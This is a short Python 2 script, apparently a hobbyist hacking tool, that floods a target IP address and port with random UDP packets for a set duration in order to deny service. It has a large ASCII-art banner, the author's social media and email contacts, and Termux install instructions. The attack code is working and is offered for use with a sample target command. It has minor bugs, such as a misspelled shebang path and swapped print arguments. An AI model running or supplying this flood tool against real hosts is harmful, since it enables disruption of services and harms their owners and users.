#!/use/bin/python2
#code by ALSAKKA
#you tube:- https://www.youtube.com/channel/UCs2SEh8YKE0bBsd0s986iXw
#cp -a ALSAKK-DDos.py /data/data/com.termux/files/usr/bin
import time
import socket
import random
import sys
import os
print('|\033[1;34m')
print("-------------------------------------------------------------------")
print("|                                                                 |")
print("|* Abdullah Alsakka                                               |")
print("|                                                                 |")
print("|* facebook: https://www.facebook.com/Abdullah.Al.Sakka.hak       |")
print("|                                                                 |")
print("|* email: aabdullah457010@gmail.com                               |")
print("|                                                                 |")
print("-------------------------------------------------------------------")
print('\033[1;35m')
print('            ..')
print('             "$$$$$e.')
print('                "$$$$$$$e.')
print('                   *$$$$$$$$e')
print('              "ee..  ^*$$$$$$$b')
print('                *$$$$$$$$$$$$$$$')
print('                  *$$$$$$$$$$$$$b')
print('                    "$$$$$$$$$$$$.')
print('               $$$eeec3$$$$$$$$$$$')
print('                *$$$$$$$$$$$$$$$$$L')
print('                 "$$$$$$$$$$$$$$$$$ ..eeee.')
print('                   "$$$$$$$$$$$$$$$$$$$$$$$$b')
print('=c.                  $$$$$$$$$$$$$$$$$$$$$$$$$$$')
print('  *$$bc            d$$$$$$$$$$$$$$$$$$$$$$$$$$"')
print('    "$$$$$be...e$$$$$$$$$$$$$$$$$$$$$$$$$$$"')
print('      *$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P*"')
print('       ^$$$$$$$$$$$$$$$$$$$$$$$$$$$$F')
print('        $$$$$$$$$$$$$$$$$$$$$$$$$$$$"')
print('        $$$$$$$*"     $$$$$$$$$$$$$$')
print('       $$$$$P"      .$$$$$$$$$$$$$$$')
print('      $$$$"        .$$$$$$$$$$$$$$$$')
print('    .$$*          .$$$$$$$$$$$$$$$$"')
print('   zP"           .$$P**$$$$$$$$$$$"')
print('                     z$$$$$$$$$$$P')
print('                    d$$$$$$$$$$$P')
print('                   $$$$*)$$$$$$"')
print('                 .$*"  d$$$$$$')
print('                     z$$$$$$"')
print('                    $$$$$$"')
print('                  z$$$$P"')
print('                .$$$$"')
print('                ...')
print('\033[1;31m')
def usage():
    os.system("figlet ALSAKKA")
    print '''
        python2 ALSAKK-DDos.py 172.0.0.1 80 400000 '''
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 400000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking  %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

